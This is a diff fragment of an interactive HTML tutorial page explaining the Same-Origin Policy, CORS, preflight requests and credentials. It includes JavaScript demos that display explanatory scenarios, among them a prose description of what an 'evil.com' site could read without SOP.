+    <tr><td>Same-Origin Policy</td><td>Browser blocks cross-origin response reading</td><td><span class="badge red">Blocks JS from reading</span></td></tr>
+    <tr><td>CORS</td><td>Server tells browser which origins are trusted</td><td><span class="badge green">Server-driven opt-in</span></td></tr>
+    <tr><td>Simple Request</td><td>GET/POST with standard headers, no preflight</td><td><span class="badge blue">No OPTIONS needed</span></td></tr>
+    <tr><td>Preflight</td><td>OPTIONS request asking server permission</td><td><span class="badge yellow">Triggered by non-simple requests</span></td></tr>
+    <tr><td>Access-Control-Allow-Origin</td><td>Which origins can read the response</td><td><span class="badge green">The core CORS header</span></td></tr>
+    <tr><td>Credentials</td><td>Cookies with cross-origin requests</td><td><span class="badge yellow">Requires explicit origin, not *</span></td></tr>
+    <tr><td>Opaque Response</td><td>Response from <code>no-cors</code> — unreadable</td><td><span class="badge red">Can't access data</span></td></tr>
+    <tr><td>CORS Proxy</td><td>Server-to-server relay to bypass CORS</td><td><span class="badge yellow">Workaround, not a fix</span></td></tr>
+  </table>
+</div>
+
+<div class="callout success" style="text-align:center;padding:16px;font-size:.9rem">
+  <strong>&#10003; CORS is the browser asking the server for permission.</strong> The server speaks first with headers; the browser enforces the decision.
+</div>
+
+</div><!-- /container -->
+
+<script>
+// =====================================================
+// WITHOUT SOP DEMO
+// =====================================================
+function showWorldWithoutSOP() {
+  const box = document.getElementById('whatifNoSOP');
+  box.innerHTML = `
+    <div class="world"><span class="bad" style="font-size:1.2rem">&#128308; Without SOP — total chaos</span></div>
+    <div style="font-size:.84rem;line-height:1.8;margin-top:6px">
+      <div>&#128279; <strong>evil.com</strong> loads an invisible iframe pointing to <strong>gmail.com</strong></div>
+      <div>&#128279; Reads your emails via <code>iframe.contentDocument</code></div>
+      <div>&#128279; <strong>evil.com</strong> fetches <strong>bank.com/api/transactions</strong> and reads the JSON</div>
+      <div>&#128279; <strong>evil.com</strong> fetches <strong>facebook.com/api/friends</strong> and steals your contacts</div>
+      <div>&#128279; <strong>evil.com</strong> reads your <strong>github.com</strong> private repos</div>
+      <div style="margin-top:8px;color:var(--red);font-weight:700">Any website could read any other website's data.</div>
+    </div>
+  `;
+  document.getElementById('theAttackCard').style.display = 'block';
+  document.getElementById('whatifWithSOP').innerHTML = `<div class="world" style="color:var(--muted)">// Compare with the "With SOP" view</div>`;
+}
+
+function showWorldWithSOP() {
+  const box = document.getElementById('whatifWithSOP');
+  box.innerHTML = `
+    <div class="world"><span class="good" style="font-size:1.2rem">&#128994; With SOP — safe and sound</span></div>
+    <div style="font-size:.84rem;line-height:1.8;margin-top:6px">
+      <div>&#10003; <strong>evil.com</strong> tries to fetch <strong>bank.com</strong>...</div>
+      <div>&#10003; Browser sends the request (cookie auto-attached)</div>
+      <div>&#10003; Bank server processes it and sends response</div>
+      <div>&#10003; <strong style="color:var(--red)">Browser BLOCKS evil.com's JS from reading the response</strong></div>
+      <div>&#10003; Attacker sees: <code>CORS error</code></div>
+      <div>&#10003; Your bank data stays private</div>
+      <div style="margin-top:8px;color:var(--green);font-weight:700">SOP is the foundation of web security.</div>
+    </div>
+  `;
+  document.getElementById('theAttackCard').style.display = 'block';
+  document.getElementById('whatifNoSOP').innerHTML = `<div class="world" style="color:var(--muted)">// Compare with the "Without SOP" view</div>`;
+}
+
+// =====================================================
+// CORS SCENARIOS
+// =====================================================
+function selectCorsScenario(id, btn) {
+  document.querySelectorAll('.scenario-content').forEach(el => el.classList.remove('active'));
+  document.querySelectorAll('.scenario-tab').forEach(el => el.classList.remove('active'));
+  document.getElementById('scenario-' + id).classList.add('active');
+  btn.classList.add('active');
+}
+
+const scenarios = {
+  'simple': {
+    result: 'success',
+    icon: '&#10003;',
+    title: 'Request allowed (simple GET)',
+    detail: `<span style="color:var(--green)">CORS allows this request.</span><br>
+    The browser sees the response has <code>Access-Control-Allow-Origin: https://myapp.com</code> (or <code>*</code>).<br>
+    Your JavaScript can read the response data. No preflight needed — this is a "simple request".`
+  },
+  'custom-header': {
+    result: 'success',
+    icon: '&#10003;',
+    title: 'Preflight succeeded',
+    detail: `<span style="color:var(--green)">CORS allows this request after preflight.</span><br>
+    Browser sent an OPTIONS preflight asking about <code>X-API-Key</code> header.<br>
+    Server responded with <code>Access-Control-Allow-Headers: X-API-Key</code>.<br>
+    Browser then sends the actual GET request with the custom header.`
+  },
+  'credentials': {
+    result: 'success',
+    icon: '&#10003;',
+    title: 'Request with credentials allowed',
+    detail: `<span style="color:var(--green)">CORS allows credentialed request.</span><br>
+    Server sent both:<br>
+    <code>Access-Control-Allow-Credentials: true</code><br>
+    <code>Access-Control-Allow-Origin: https://myapp.com</code> (NOT <code>*</code>)<br>
+    Your cookies are sent and the response is readable.`
+  },
+  'put': {
+    result: 'success',
+    icon: '&#10003;',
+    title: 'Preflight succeeded (PUT + JSON)',
+    detail: `<span style="color:var(--green)">CORS allows this PUT request.</span><br>
+    Browser sent OPTIONS preflight. Server allowed PUT method and application/json Content-Type.<br>
+    Preflight cached for future requests (Access-Control-Max-Age).`
+  },
+  'no-cors': {
+    result: 'fail',
+    icon: '&#9888;',
+    title: 'CORS error — request blocked',
+    detail: `<span style="color:var(--red)">CORS blocks JavaScript from reading the response.</span><br>
+    The server processed the request and sent data back.<br>
+    But the response has <strong>no</strong> <code>Access-Control-Allow-Origin</code> header.<br>
+    The browser throws the response away from JS's perspective.<br>
+    <strong>Note:</strong> If this was a POST, the server-side action still happened!`
+  }
+};
+
+function runCorsScenario(id) {
+  const s = scenarios[id];
+  const box = document.getElementById('result-' + id);
+  box.className = 'result-box ' + s.result;
+  box.innerHTML = `
+    <div class="icon">${s.icon}</div>
+    <div class="detail">
+      <strong>${s.title}</strong><br><br>
+      ${s.detail}
+    </div>
+  `;
+}
+
+// =====================================================
+// PREFLIGHT ANIMATION
+// =====================================================
+let pfInterval = null;
+function animatePreflight() {
+  clearInterval(pfInterval);
+  const log = document.getElementById('preflightLog');
+  const browser = document.getElementById('pfBrowser');
+  const server = document.getElementById('pfServer');
+  log.innerHTML = '';
+  const steps = [
+    {msg: '&#128187; Browser: Need to send PUT with JSON...', delay: 0},
+    {msg: '&#128187; Browser: This is NOT a "simple" request. Sending OPTIONS preflight first.', delay: 600},
+    {msg: '&#128279; OPTIONS /users (preflight) &#8594; server', delay: 1200},
+    {msg: '<span style="color:var(--muted)">  Origin: https://myapp.com</span>', delay: 1400},
+    {msg: '<span style="color:var(--muted)">  Access-Control-Request-Method: PUT</span>', delay: 1600},
+    {msg: '&#127974; Server checks origin, method...', delay: 2200},
+    {msg: '<span style="color:var(--green)">&#10003; Server: Origin is allowed. PUT is allowed. Sending approval.</span>', delay: 2800},
+    {msg: '&#8592; 204 No Content (preflight response)', delay: 3400},
+    {msg: '<span style="color:var(--muted)">  Access-Control-Allow-Origin: https://myapp.com</span>', delay: 3600},
+    {msg: '<span style="color:var(--muted)">  Access-Control-Allow-Methods: PUT, POST, GET</span>', delay: 3800},
+    {msg: '&#128187; Browser: Preflight approved! Sending actual request.', delay: 4400},
+    {msg: '&#128279; PUT /users (actual request) &#8594; server', delay: 5000},
+    {msg: '&#127974; Server processes PUT request...', delay: 5600},
+    {msg: '<span style="color:var(--green)">&#10003; Success! Response sent. CORS header present. Browser shares data with JS.</span>', delay: 6200},
+  ];
+  steps.forEach(s => {
+    setTimeout(() => {
+      log.innerHTML += `<div>${s.msg}</div>\n`;
+      if (s.msg.includes('OPTIONS')) {
+        browser.style.borderColor = 'var(--yellow)';
+      } else if (s.msg.includes('approved')) {
+        browser.style.borderColor = 'var(--green)';
+        server.style.borderColor = 'var(--green)';
+      } else if (s.msg.includes('Success')) {
+        browser.style.borderColor = 'var(--blue)';
+        server.style.borderColor = 'var(--green)';
+        log.innerHTML += `<div style="color:var(--green);font-weight:700;margin-top:4px">&#10003; Preflight flow complete!</div>\n`;
+      }
+    }, s.delay);
+  });
+}
+
+function resetPreflight() {
+  clearInterval(pfInterval);
+  document.getElementById('preflightLog').innerHTML = '// Click "Show Preflight Flow"';
+  document.getElementById('pfBrowser').style.borderColor = 'var(--blue)';
+  document.getElementById('pfServer').style.borderColor = 'var(--green)';
+}
+
+// =====================================================
+// INIT
+// =====================================================
+</script>
+</body>
+</html>
